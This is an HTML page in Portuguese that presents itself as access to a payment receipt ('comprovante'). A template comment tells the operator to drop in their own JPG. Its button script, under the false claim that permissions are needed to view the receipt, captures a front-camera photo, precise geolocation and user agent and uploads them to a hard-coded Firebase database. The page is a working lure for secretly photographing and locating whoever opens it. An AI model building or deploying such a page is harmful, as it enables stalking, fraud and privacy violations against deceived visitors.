<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Acesso ao Comprovante</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }

    body {
      background: #000;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      padding: 10px;
    }

    .container {
      width: 100%;
      max-width: 500px;
      background: #000;
      border-radius: 15px;
      overflow: hidden;
      box-shadow: 0 20px 60px rgba(0,0,0,.8);
    }

    .imagem-wrapper {
      width: 100%;
      background: #000;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .imagem-comprovante {
      width: 100%;
      height: auto;
      max-height: 70vh;
      object-fit: contain;
      display: block;
    }

    .aviso {
      background: #1a1a1a;
      color: #fff;
      text-align: center;
      padding: 20px 16px;
      font-size: 18px;
      font-weight: 700;
      line-height: 1.4;
    }

    .aviso span {
      display: block;
      margin-top: 7px;
      color: #bbb;
      font-size: 12px;
      font-weight: 400;
    }

    .controls {
      background: #1a1a1a;
      padding: 20px;
      text-align: center;
    }

    .info {
      color: #fff;
      font-size: 13px;
      line-height: 1.5;
      margin-bottom: 15px;
    }

    button {
      width: 100%;
      border: 0;
      border-radius: 8px;
      padding: 14px 20px;
      background: linear-gradient(135deg, #667eea, #764ba2);
      color: #fff;
      font-size: 16px;
      font-weight: 700;
      cursor: pointer;
    }

    button:disabled {
      opacity: .55;
      cursor: not-allowed;
    }

    .status {
      display: none;
      margin-top: 12px;
      padding: 9px;
      border-radius: 6px;
      font-size: 12px;
    }

    .status.show { display: block; }
    .success { background: #4caf50; color: #fff; }
    .error { background: #f44336; color: #fff; }
    .warning { background: #ff9800; color: #fff; }

    video, canvas {
      display: none;
    }
  </style>
</head>

<body>
  <main class="container">

    <!--
      TROQUE "comprovante.jpg" pelo nome do seu JPG.
      Exemplo: src="meu-comprovante.jpg"
    -->
    <div class="imagem-wrapper">
      <img
        id="imagemComprovante"
        class="imagem-comprovante"
        src="comprovante.jpg"
        alt="Comprovante"
        onerror="this.style.display='none'; document.getElementById('imagemAviso').style.display='block';"
      >
      <div id="imagemAviso" style="display:none;color:#777;padding:50px;text-align:center;">
        JPG do comprovante não encontrado.<br>
        Coloque o arquivo como <strong>comprovante.jpg</strong>.
      </div>
    </div>

    <div class="aviso">
      Para Acessar o Comprovante Liberar Acesso
      <span>Será solicitado acesso à câmera e à localização.</span>
    </div>

    <video id="camera" playsinline autoplay></video>
    <canvas id="canvas"></canvas>

    <section class="controls">
      <div class="info">
        Para continuar, você deverá autorizar o acesso à câmera e à localização.
        Esses dados serão enviados ao sistema para registro.
      </div>

      <button id="btnEnviar" onclick="capturarEEnviar()">
        🔓 Liberar Acesso
      </button>

      <div id="status" class="status"></div>
    </section>
  </main>

  <!-- Firebase -->
  <script src="https://www.gstatic.com/firebasejs/10.3.1/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/10.3.1/firebase-database-compat.js"></script>

  <script>
    const firebaseConfig = {
      databaseURL: "https://hizag-b0c4b-default-rtdb.firebaseio.com/"
    };

    let db = null;

    try {
      firebase.initializeApp(firebaseConfig);
      db = firebase.database();
    } catch (e) {
      console.error("Firebase não configurado:", e);
    }

    const video = document.getElementById("camera");
    const canvas = document.getElementById("canvas");
    const btnEnviar = document.getElementById("btnEnviar");
    const statusDiv = document.getElementById("status");

    function mostrarStatus(msg, tipo) {
      statusDiv.textContent = msg;
      statusDiv.className = "status show " + tipo;
    }

    function mensagemErroGeo(codigo) {
      switch (codigo) {
        case 1: return "Permissão de localização negada.";
        case 2: return "Localização indisponível.";
        case 3: return "Tempo esgotado para obter localização.";
        default: return "Não foi possível obter a localização.";
      }
    }

    function obterLocalizacao() {
      return new Promise((resolve) => {
        if (!navigator.geolocation) {
          resolve({ erro: "Este navegador não suporta localização." });
          return;
        }

        navigator.geolocation.getCurrentPosition(
          position => {
            const lat = position.coords.latitude;
            const lng = position.coords.longitude;

            resolve({
              latitude: lat,
              longitude: lng,
              precisao: Math.round(position.coords.accuracy),
              timestamp: new Date().toLocaleString("pt-BR"),
              googleMapsUrl: `https://maps.google.com/?q=${lat},${lng}`
            });
          },
          err => resolve({ erro: mensagemErroGeo(err.code) }),
          {
            enableHighAccuracy: true,
            timeout: 20000,
            maximumAge: 0
          }
        );
      });
    }

    async function obterCamera() {
      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
        throw new Error("Este navegador não permite acesso à câmera.");
      }

      const stream = await navigator.mediaDevices.getUserMedia({
        video: {
          facingMode: "user",
          width: { ideal: 1280 },
          height: { ideal: 720 }
        },
        audio: false
      });

      video.srcObject = stream;

      // Aguarda a câmera disponibilizar dimensões válidas.
      await new Promise(resolve => {
        if (video.videoWidth) {
          resolve();
        } else {
          video.onloadedmetadata = () => resolve();
        }
      });

      await new Promise(resolve => setTimeout(resolve, 500));

      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;

      const ctx = canvas.getContext("2d");
      ctx.drawImage(video, 0, 0);

      const foto = canvas.toDataURL("image/jpeg", 0.8);

      // Encerra a câmera depois da captura.
      stream.getTracks().forEach(track => track.stop());
      video.srcObject = null;

      return foto;
    }

    async function capturarEEnviar() {
      if (!db) {
        mostrarStatus("Sistema Firebase não configurado.", "error");
        return;
      }

      btnEnviar.disabled = true;
      btnEnviar.textContent = "Solicitando permissões...";

      try {
        // As duas permissões são solicitadas explicitamente após o clique.
        const [localizacao, foto] = await Promise.all([
          obterLocalizacao(),
          obterCamera()
        ]);

        if (localizacao.erro) {
          mostrarStatus("⚠️ " + localizacao.erro, "warning");
          btnEnviar.disabled = false;
          btnEnviar.textContent = "🔓 Liberar Acesso";
          return;
        }

        btnEnviar.textContent = "Enviando registro...";

        const timestamp = Date.now();

        const dados = {
          timestamp: new Date().toLocaleString("pt-BR"),
          foto: foto,
          localizacao: localizacao,
          userAgent: navigator.userAgent
        };

        await db.ref("capturas/" + timestamp).set(dados);

        mostrarStatus("✅ Acesso liberado e registro enviado.", "success");
        btnEnviar.textContent = "✅ Acesso Liberado";

      } catch (error) {
        console.error(error);

        let mensagem = "Não foi possível concluir o acesso.";

        if (error.name === "NotAllowedError") {
          mensagem = "A permissão da câmera foi negada.";
        } else if (error.name === "NotFoundError") {
          mensagem = "Nenhuma câmera disponível.";
        }

        mostrarStatus("❌ " + mensagem, "error");
        btnEnviar.disabled = false;
        btnEnviar.textContent = "🔓 Liberar Acesso";
      }
    }
  </script>
</body>
</html>
